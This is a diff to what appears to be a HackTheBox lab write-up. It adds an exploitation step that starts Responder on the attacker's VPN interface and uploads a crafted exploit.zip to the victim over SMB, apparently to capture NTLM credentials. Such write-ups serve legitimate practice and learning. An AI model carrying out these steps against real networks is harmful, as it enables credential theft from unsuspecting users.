@@ -237,3 +237,14 @@ Explaination
 -f : name of the library without extension we can see that in [[#SMB listings|Here]]
 -i : our hackthebox vpn ip or tun0 ip 
 
+#### Exploitation
+Now lets start our responder on tun0 or whatever your HTB vpn interface is.
+```bash
+sudo python3 Responder.py -I tun0 
+```
+
+and then upload the exploit.zip file to the victim via smb
+```bash
+smb: \> put exploit.zip
+# output: putting file exploit.zip as \exploit.zip (0.9 kb/s) (average 0.9 kb/s)
+```
